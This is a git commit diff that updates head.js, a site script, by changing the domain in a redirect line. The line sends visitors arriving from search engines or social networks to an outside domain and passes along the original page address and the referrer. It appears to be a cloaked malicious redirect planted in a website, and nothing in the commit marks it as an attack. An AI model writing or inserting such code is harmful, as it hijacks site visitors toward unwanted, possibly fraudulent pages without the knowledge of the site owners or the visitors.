4e39e5ddbc01f2e3aaf832bdabca88d78acf78ca
hiroshimada <lajunastudio@gmail.com>
2025-01-28 02:51:32 +0700

    Update head.js

--- x/head.js
+++ x/head.js
@@ -16,5 +16,5 @@ document.write('</div>');
 document.write('</noscript>');
 
 // J
-var ars = 'http://blog.editorialtecnologica.com';
+var ars = 'http://blog.wm.edu.pl';
 if(['.google.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
